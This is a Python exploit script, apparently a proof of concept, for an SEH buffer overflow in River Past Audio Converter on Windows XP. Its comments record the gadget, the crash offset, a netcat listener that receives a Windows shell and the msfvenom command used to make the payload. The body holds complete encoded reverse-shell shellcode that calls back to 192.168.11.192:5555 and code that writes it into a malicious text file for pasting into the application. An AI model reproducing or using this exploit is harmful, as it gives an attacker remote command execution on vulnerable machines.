#!/usr/bin/python
# paste file content to "FILE > OPTION > BROWSE TEXTBOX"


#01391268   5F               POP EDI
#01391269   5E               POP ESI
#0139126A   C3               RETN

#root@kali:~# /usr/bin/msf-pattern_offset -q 356A4134
#[*] Exact match at offset 284

#root@kali:~# nc -nvlp 5555
#listening on [any] 5555 ...
#connect to [192.168.11.192] from (UNKNOWN) [192.168.11.177] 1240
#Microsoft Windows XP [Version 5.1.2600]
#(C) Copyright 1985-2001 Microsoft Corp.
#
#C:\Program Files\River Past\Audio Converter>

#root@kali:~# msfvenom -p windows/shell_reverse_tcp lhost=192.168.11.192 lport=5555 -f python -e x86/alpha_mixed
#[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
#[-] No arch selected, selecting arch: x86 from the payload
#Found 1 compatible encoders
#Attempting to encode payload with 1 iterations of x86/alpha_mixed
#x86/alpha_mixed succeeded with size 709 (iteration=0)
#x86/alpha_mixed chosen with final size 709
#Payload size: 709 bytes
#Final size of python file: 3396 bytes
buf =  ""
buf += "\x89\xe1\xd9\xe9\xd9\x71\xf4\x5a\x4a\x4a\x4a\x4a\x4a"
buf += "\x4a\x4a\x4a\x4a\x4a\x4a\x43\x43\x43\x43\x43\x43\x37"
buf += "\x52\x59\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41"
buf += "\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
buf += "\x50\x38\x41\x42\x75\x4a\x49\x6b\x4c\x39\x78\x6f\x72"
buf += "\x33\x30\x65\x50\x55\x50\x65\x30\x4e\x69\x7a\x45\x50"
buf += "\x31\x59\x50\x52\x44\x4e\x6b\x70\x50\x74\x70\x6e\x6b"
buf += "\x42\x72\x74\x4c\x6e\x6b\x73\x62\x66\x74\x6c\x4b\x34"
buf += "\x32\x37\x58\x74\x4f\x38\x37\x33\x7a\x54\x66\x34\x71"
buf += "\x79\x6f\x4e\x4c\x35\x6c\x31\x71\x43\x4c\x36\x62\x34"
buf += "\x6c\x55\x70\x5a\x61\x48\x4f\x54\x4d\x76\x61\x6f\x37"
buf += "\x4d\x32\x5a\x52\x32\x72\x53\x67\x4c\x4b\x30\x52\x44"
buf += "\x50\x4e\x6b\x32\x6a\x77\x4c\x4e\x6b\x50\x4c\x77\x61"
buf += "\x42\x58\x6d\x33\x53\x78\x35\x51\x4e\x31\x36\x31\x6e"
buf += "\x6b\x70\x59\x57\x50\x77\x71\x68\x53\x4e\x6b\x72\x69"
buf += "\x62\x38\x48\x63\x76\x5a\x50\x49\x4c\x4b\x75\x64\x4e"
buf += "\x6b\x67\x71\x69\x46\x55\x61\x79\x6f\x4c\x6c\x6b\x71"
buf += "\x48\x4f\x74\x4d\x65\x51\x6f\x37\x70\x38\x4d\x30\x32"
buf += "\x55\x4b\x46\x44\x43\x33\x4d\x38\x78\x35\x6b\x43\x4d"
buf += "\x31\x34\x43\x45\x79\x74\x61\x48\x6e\x6b\x30\x58\x61"
buf += "\x34\x77\x71\x7a\x73\x30\x66\x4c\x4b\x54\x4c\x50\x4b"
buf += "\x6e\x6b\x53\x68\x47\x6c\x75\x51\x6b\x63\x6c\x4b\x76"
buf += "\x64\x6e\x6b\x73\x31\x4a\x70\x6d\x59\x57\x34\x44\x64"
buf += "\x66\x44\x73\x6b\x51\x4b\x43\x51\x71\x49\x51\x4a\x62"
buf += "\x71\x6b\x4f\x49\x70\x31\x4f\x51\x4f\x62\x7a\x6e\x6b"
buf += "\x74\x52\x78\x6b\x4c\x4d\x61\x4d\x32\x48\x67\x43\x64"
buf += "\x72\x35\x50\x77\x70\x71\x78\x54\x37\x33\x43\x35\x62"
buf += "\x33\x6f\x36\x34\x75\x38\x70\x4c\x33\x47\x51\x36\x55"
buf += "\x57\x69\x6f\x39\x45\x4c\x78\x5a\x30\x77\x71\x43\x30"
buf += "\x67\x70\x65\x79\x6a\x64\x56\x34\x70\x50\x63\x58\x36"
buf += "\x49\x6d\x50\x32\x4b\x73\x30\x49\x6f\x38\x55\x46\x30"
buf += "\x46\x30\x46\x30\x70\x50\x77\x30\x42\x70\x63\x70\x36"
buf += "\x30\x63\x58\x58\x6a\x34\x4f\x59\x4f\x49\x70\x69\x6f"
buf += "\x6b\x65\x6a\x37\x73\x5a\x73\x35\x35\x38\x6f\x30\x6c"
buf += "\x68\x44\x4b\x49\x50\x65\x38\x43\x32\x53\x30\x37\x65"
buf += "\x6c\x73\x6c\x49\x49\x76\x71\x7a\x46\x70\x30\x56\x72"
buf += "\x77\x31\x78\x4e\x79\x4d\x75\x30\x74\x31\x71\x39\x6f"
buf += "\x6a\x75\x6f\x75\x39\x50\x44\x34\x56\x6c\x69\x6f\x70"
buf += "\x4e\x47\x78\x30\x75\x48\x6c\x70\x68\x6a\x50\x78\x35"
buf += "\x6c\x62\x53\x66\x6b\x4f\x38\x55\x50\x68\x45\x33\x62"
buf += "\x4d\x53\x54\x55\x50\x6c\x49\x69\x73\x56\x37\x51\x47"
buf += "\x36\x37\x75\x61\x4b\x46\x33\x5a\x66\x72\x63\x69\x42"
buf += "\x76\x68\x62\x4b\x4d\x42\x46\x78\x47\x73\x74\x75\x74"
buf += "\x47\x4c\x77\x71\x45\x51\x4e\x6d\x53\x74\x67\x54\x64"
buf += "\x50\x6f\x36\x37\x70\x67\x34\x73\x64\x62\x70\x53\x66"
buf += "\x71\x46\x31\x46\x61\x56\x56\x36\x72\x6e\x32\x76\x32"
buf += "\x76\x36\x33\x52\x76\x32\x48\x54\x39\x38\x4c\x75\x6f"
buf += "\x4f\x76\x4b\x4f\x6e\x35\x6b\x39\x4b\x50\x62\x6e\x73"
buf += "\x66\x30\x46\x79\x6f\x54\x70\x53\x58\x36\x68\x6b\x37"
buf += "\x35\x4d\x43\x50\x6b\x4f\x5a\x75\x6d\x6b\x38\x70\x4f"
buf += "\x45\x69\x32\x46\x36\x32\x48\x4d\x76\x4e\x75\x6f\x4d"
buf += "\x4f\x6d\x79\x6f\x6e\x35\x77\x4c\x75\x56\x61\x6c\x56"
buf += "\x6a\x6b\x30\x49\x6b\x79\x70\x72\x55\x44\x45\x4d\x6b"
buf += "\x31\x57\x35\x43\x43\x42\x72\x4f\x72\x4a\x63\x30\x33"
buf += "\x63\x69\x6f\x6e\x35\x41\x41"


buffer = "A"*280 + "\xEB\x06\xEB\x04" + "\x68\x12\x39\x01" + buf + "D"*6000
try:
	f=open("Evil.txt","w")
	print "[+] Creating %s bytes evil payload.." %len(buffer)
	f.write(buffer)
	f.close()
	print "[+] File created!"
except Exception as e:
	print e

